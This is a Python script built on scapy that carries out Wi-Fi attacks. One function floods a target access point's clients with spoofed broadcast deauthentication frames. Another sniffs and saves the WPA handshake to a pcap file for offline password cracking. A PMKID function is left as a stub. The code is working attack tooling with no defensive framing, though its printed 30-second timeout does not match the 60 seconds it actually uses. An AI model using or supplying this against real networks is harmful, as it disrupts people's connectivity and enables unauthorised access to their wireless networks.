import os
import subprocess
from scapy.all import *

def deauth_attack(target, interface, count):
    """
    Performs a deauthentication attack on the selected target.
    """
    bssid = target.get("bssid")
    channel = target.get("channel")
    ssid = target.get("ssid")

    if not channel or channel == 'N/A':
        print(f"[!] Target '{ssid}' has no channel information. Cannot perform attack.")
        return

    print(f"[*] Setting interface {interface} to channel {channel}")
    try:
        subprocess.run(['iwconfig', interface, 'channel', str(channel)], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print(f"[!] Failed to set channel on {interface}. The attack may fail.")

    print(f"[*] Performing broadcast deauthentication attack on {ssid} ({bssid})")
    
    # Craft the deauthentication packet (AP to Broadcast)
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    
    # Send the packets
    for i in range(count):
        sendp(packet, iface=interface, verbose=False)
        print(f"Sent deauthentication packet {i+1}/{count}", end='\r')
    print("\n[+] Deauthentication packets sent.")

def capture_handshake(target, interface):
    """
    Captures the WPA handshake with a timeout.
    """
    print(f"[*] Capturing handshake for {target['ssid']} (timeout: 30s)... Press Ctrl+C to stop early.")
    
    packets = []
    try:
        # Sniff for EAPOL packets with a timeout, but without a BPF filter
        packets = sniff(iface=interface, stop_filter=lambda p: p.haslayer(EAPOL), timeout=60)
        eapol_packets = [p for p in packets if p.haslayer(EAPOL)]

    except Exception as e:
        print(f"[!] An error occurred during capture: {e}")

    if 'eapol_packets' in locals() and len(eapol_packets) >= 2:
        wrpcap("handshake.pcap", eapol_packets)
        print("[+] Handshake captured and saved to handshake.pcap")
    else:
        print("[!] Failed to capture handshake. A client may not have reconnected in time.")

def capture_pmkid(target, interface):
    # This function remains unchanged for now
    pass
